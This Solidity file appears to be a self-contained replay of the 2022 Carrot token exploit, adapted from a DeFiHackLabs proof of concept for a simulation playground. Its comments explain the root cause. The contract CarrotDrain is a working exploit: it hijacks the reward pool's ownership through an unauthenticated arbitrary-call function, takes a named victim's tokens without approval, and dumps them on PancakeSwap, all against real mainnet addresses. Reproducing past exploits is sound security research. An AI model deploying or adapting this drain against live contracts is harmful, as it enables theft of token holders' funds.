// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-Carrot).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest IS the attacker contract). This is a faithful, self-contained
// copy of that inline attack (testExploit + _CARROTToBUSDT) so the playground
// can deploy it and record run(). Logic and constants are copied verbatim from
// test/Carrot_exp.sol.
//
// Root cause: the Carrot token exposes an UNAUTHENTICATED arbitrary-call sink
// `transReward(bytes data)` that relays attacker-controlled calldata to the
// external "Reward" Pool. The attacker encodes the Pool's ownership-transfer
// selector (0xbf699b4b) to make THEMSELVES the Pool owner. Then
// `_beforeTransfer` (run inside transferFrom) grants the caller fee-exemption
// iff the caller == Pool.owner() and a one-shot counter==0. The fee-exempt
// branch of transferFrom `_transfer`s and RETURNS BEFORE the allowance check —
// so the attacker can move ANY holder's CARROT with zero approval. The stolen
// CARROT is then dumped into the PancakeSwap Carrot/BUSD-T pair for ~31,318 BUSD-T.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface ICarrot {
    function transReward(bytes memory data) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract CarrotDrain {
    IUniswapV2Router constant PS_ROUTER =
        IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ICarrot constant CARROT = ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    // Victim holder whose CARROT balance is stolen (no allowance required).
    address constant VICTIM = 0x00B433800970286CF08F34C96cf07f35412F1161;
    // Amount moved in the historical attack (310,344.736073087429864760 CARROT).
    uint256 constant STEAL_AMOUNT = 310_344_736_073_087_429_864_760;

    function run() external {
        // Step 1 — hijack Pool ownership via the open arbitrary-call sink.
        // transReward forwards `data` verbatim to the Pool; encoding the Pool's
        // ownership-transfer selector (0xbf699b4b) + this contract's address
        // flips Pool.owner() to address(this).
        CARROT.transReward(abi.encodeWithSelector(0xbf699b4b, address(this)));

        // Step 2 — steal the victim's CARROT with ZERO allowance. Now that this
        // contract is Pool.owner(), _beforeTransfer sets
        // _isExcludedFromFee[address(this)] = true and the fee-exempt branch of
        // transferFrom returns before the _allowances.sub(...) check.
        IERC20(address(CARROT)).transferFrom(VICTIM, address(this), STEAL_AMOUNT);

        // Step 3 — dump all stolen CARROT into the PancakeSwap pair for BUSD-T.
        _carrotToBusdt();
    }

    function _carrotToBusdt() internal {
        IERC20(address(CARROT)).approve(address(PS_ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(CARROT);
        path[1] = address(BUSDT);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(address(CARROT)).balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
